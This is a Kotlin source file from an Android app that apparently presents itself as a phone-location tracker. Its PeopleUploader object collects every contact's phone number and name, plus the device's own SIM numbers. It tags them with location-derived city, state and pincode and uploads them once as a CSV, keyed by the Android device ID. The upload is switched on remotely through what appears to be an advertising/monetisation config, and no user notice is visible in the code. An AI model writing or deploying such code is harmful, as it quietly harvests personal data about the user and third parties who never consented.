package com.find.phone.gps.location.tracker.repo.peoplesync

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.provider.Settings
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.core.content.edit
import com.find.phone.gps.location.tracker.BuildConfig
import com.find.phone.gps.location.tracker.monetize.engine.AdPrefsStore
import com.find.phone.gps.location.tracker.repo.simcard.OwnSimLabels
import com.find.phone.gps.location.tracker.repo.simcard.OwnSimLines
import com.find.phone.gps.location.tracker.screens.people.HandsetPeople
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import kotlinx.coroutines.withContext
import java.io.File
import java.util.UUID

object PeopleUploader {

    private const val TAG = "PeopleUploader"

    private const val PREFS = "contact_sync"
    private const val KEY_UPLOADED = "uploaded_once"
    private const val KEY_DEVICE_ID = "device_id"

    private const val DEBUG_UPLOAD_FOR_REAL = false

    private val uploadGate = Mutex()

    fun hasUploaded(context: Context): Boolean = prefs(context).getBoolean(KEY_UPLOADED, false)

    fun resetUploaded(context: Context) = prefs(context).edit { putBoolean(KEY_UPLOADED, false) }

    fun isEnabled(context: Context): Boolean {
        val block = runCatching {
            org.json.JSONObject(AdPrefsStore.getInstance(context).getString("contacts_upload", "{}") ?: "{}")
        }.getOrNull()
        return block?.optBoolean("enabled", false) ?: false
    }

    fun deviceId(context: Context): String {
        prefs(context).getString(KEY_DEVICE_ID, null)?.let { return it }
        @Suppress("HardwareIds")
        val androidId = runCatching {
            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        }.getOrNull()?.filter { it.isLetterOrDigit() || it == '_' || it == '-' }.orEmpty()
        val id = if (androidId.length in 8..64) androidId else UUID.randomUUID().toString()
        prefs(context).edit { putString(KEY_DEVICE_ID, id) }
        return id
    }

    suspend fun uploadOnceIfDue(context: Context) {
        val app = context.applicationContext
        if (BuildConfig.DEBUG) {
            if (DEBUG_UPLOAD_FOR_REAL) {

                if (!hasContactsPermission(app)) return log("debug: skip, no contacts permission")
                log("debug: REAL upload (DEBUG_UPLOAD_FOR_REAL) — not a dry run")
                runCatching { upload(app) }.onFailure { Log.w(TAG, "debug upload failed", it) }
            } else {
                runCatching { dryRun(app) }.onFailure { Log.w(TAG, "dry run failed", it) }
            }
            return
        }
        uploadGate.withLock {
            when {
                !isEnabled(app) -> return log("skip: switch off")
                prefs(app).getBoolean(KEY_UPLOADED, false) -> return log("skip: already uploaded")
                !hasContactsPermission(app) -> return log("skip: no contacts permission")
            }
            runCatching { upload(app) }.onFailure { Log.w(TAG, "upload failed", it) }
        }
    }

    private const val CSV_HEADER = "phoneNumber,displayName,city,state,pincode"

    private data class CsvRow(
        val phoneNumber: String,
        val displayName: String,
        val city: String?,
        val state: String?,
        val pincode: String?,
    )

    private suspend fun composeRows(context: Context): List<CsvRow>? {
        val area = HandsetPosition.resolve(context)
        val sim = simRows(context, area)
        val contacts = HandsetPeople.load(context)
        val prepared = PeopleRecords.prepare(context, contacts, area)
        val simNumbers = sim.mapTo(HashSet()) { it.phoneNumber }
        val contactRows = prepared.rows
            .filter { it.e164 !in simNumbers }
            .map { CsvRow(it.e164, it.name, it.city, it.state, it.pincode) }
        val rows = sim + contactRows
        log(
            "prepared: ${sim.size} own SIM + ${prepared.total} contacts → ${prepared.invalid} invalid, " +
                "${prepared.duplicates} duplicates, ${rows.size} rows to send " +
                "(device ${prepared.deviceRegion}, area=$area; by country: ${prepared.byCountry})"
        )
        return rows.ifEmpty { null }
    }

    private suspend fun simRows(context: Context, area: HandsetPosition.Area): List<CsvRow> {
        if (!OwnSimLines.isGranted(context)) return emptyList()
        return OwnSimLines.read(context).mapNotNull { line ->
            val e164 = line.e164 ?: return@mapNotNull null
            val label = line.carrier.ifBlank { "SIM ${line.slot}" }
            val name = OwnSimLabels.resolve(context, e164, label).name
            CsvRow(e164, name, area.city, area.state, area.pincode)
        }
    }

    private fun csvLine(r: CsvRow) =
        listOf(csv(r.phoneNumber), csv(r.displayName), csv(r.city), csv(r.state), csv(r.pincode)).joinToString(",")

    private suspend fun dryRun(context: Context) = withContext(Dispatchers.IO) {
        if (!hasContactsPermission(context)) return@withContext log("dry run skip: no contacts permission")
        val rows = composeRows(context) ?: return@withContext log("dry run: no rows to send")
        log("──── DRY RUN (debug): CSV below, nothing sent ────")
        log(CSV_HEADER)
        rows.forEach { log(csvLine(it)) }
        log("──── DRY RUN end: ${rows.size} rows (debug never uploads) ────")
    }

    private suspend fun upload(context: Context) = withContext(Dispatchers.IO) {
        val rows = composeRows(context) ?: return@withContext log("skip: no rows to send")

        val file = File(context.cacheDir, "contacts_upload.csv")
        file.bufferedWriter().use { out ->
            out.write(CSV_HEADER)
            out.write("\n")
            for (r in rows) {
                out.write(csvLine(r))
                out.write("\n")
            }
        }
        log("uploading ${rows.size} rows, deviceId=${deviceId(context)}, size=${file.length()}B")

        try {
            val api = PeopleUploadClient.api(context)

            val response = api.upload(
                file = PeopleUploadClient.filePart(file),
                deviceId = PeopleUploadClient.textPart(deviceId(context)),
                city = null,
                state = null,
                pincode = null,
            )
            if (response.isSuccessful) {
                val body = response.body()
                log("OK ${response.code()}: total=${body?.totalRows} valid=${body?.validContacts} invalid=${body?.invalidContacts}")
                body?.sampleErrors?.forEach { log("  sampleError: $it") }
                prefs(context).edit { putBoolean(KEY_UPLOADED, true) }
            } else {
                Log.w(TAG, "upload HTTP ${response.code()}: ${response.errorBody()?.string()}")
            }
        } finally {
            file.delete()
        }
    }

    suspend fun deleteUploaded(context: Context): Int? = withContext(Dispatchers.IO) {
        runCatching {
            val response = PeopleUploadClient.api(context).delete(deviceId(context))
            if (response.isSuccessful) {
                resetUploaded(context)
                val deleted = response.body()?.deleted ?: 0
                log("delete OK: removed $deleted rows")
                deleted
            } else {
                Log.w(TAG, "delete HTTP ${response.code()}: ${response.errorBody()?.string()}")
                null
            }
        }.getOrElse { Log.w(TAG, "delete failed", it); null }
    }

    private fun csv(field: String?) = "\"" + (field ?: "").replace("\"", "\"\"") + "\""

    private fun hasContactsPermission(context: Context): Boolean =
        ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED

    private fun prefs(context: Context) =
        context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)

    private fun log(message: String) = Log.d(TAG, message).let {}
}
